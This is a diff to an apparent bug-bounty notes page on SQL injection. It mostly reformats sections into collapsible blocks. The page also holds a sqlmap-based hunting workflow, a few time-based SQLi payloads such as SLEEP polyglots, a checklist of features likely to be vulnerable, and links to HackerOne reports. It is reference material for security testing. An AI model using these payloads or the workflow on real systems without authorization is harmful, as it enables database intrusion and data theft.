@@ -6,7 +6,9 @@ description: >-
 
 # SQL Injection
 
-> **How to start**
+<details>
+
+<summary><strong>How to start</strong></summary>
 
 1. Study SQL
 2. [http://www.amazon.com/SQL-Injection-Attacks-Defense-Second/dp/1597499633/](http://www.amazon.com/SQL-Injection-Attacks-Defense-Second/dp/1597499633/)
@@ -20,13 +22,21 @@ description: >-
 
 {% embed url="https://nav1n0x.gitbook.io/a-guide-to-manually-hunting-sql-injection/" %}
 
-> **Methodology**
+</details>
+
+<details>
+
+<summary><strong>Methodology</strong></summary>
 
 * [ ] Burp Suite via Active Scan and Agartha extension
 * [ ] Collect all Subdomain -> Crawl -> `gf sqli urls >> sqli` -> `sqlmap -m sqli --dbs --batch`
-* [ ] Dork for extensions like `.php` or paths that most like to be vulnerable to SQLI -> `Arjun` -> `sqlmap`
+* [ ] Dork for extensions like `.php` or paths that most like to be vulnerable to `SQLI` -> `Arjun` -> `sqlmap`
 
-> **Time Based SQLi Payloads**
+</details>
+
+<details>
+
+<summary><strong>Time Based SQLi Payloads</strong></summary>
 
 ```python
 sleep(5)#
@@ -127,7 +137,26 @@ OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
 SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
 ```
 
-## Top SQLI reports from HackerOne:
+
+
+</details>
+
+<details>
+
+<summary><strong>Top Features Vulnerable to SQL Injection</strong></summary>
+
+* [ ] Forgotten Password form
+* [ ] Email Reset Link
+* [ ] Account Verification
+* [ ] Username Lookup
+* [ ] Password Reset Token
+* [ ] Email Change Request
+
+</details>
+
+<details>
+
+<summary><strong>Top SQLI reports from HackerOne:</strong></summary>
 
 1. [SQL Injection Extracts Starbucks Enterprise Accounting, Financial, Payroll Database](https://hackerone.com/reports/531051) to Starbucks - 743 upvotes, $0
 2. [SQL injection in https://labs.data.gov/dashboard/datagov/csv\_to\_json via User-agent ](https://hackerone.com/reports/297478)to GSA Bounty - 671 upvotes, $0
@@ -159,3 +188,8 @@ SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
 28. [bypass sql injection #1109311](https://hackerone.com/reports/1224660) to Acronis - 150 upvotes, $0
 29. [SQL injection in GraphQL endpoint through embedded\_submission\_form\_uuid parameter](https://hackerone.com/reports/435066) to HackerOne - 147 upvotes, $0
 30. [SQL Injection Union Based](https://hackerone.com/reports/1046084) to Automattic - 123 upvotes, $0
+
+
+
+</details>
+
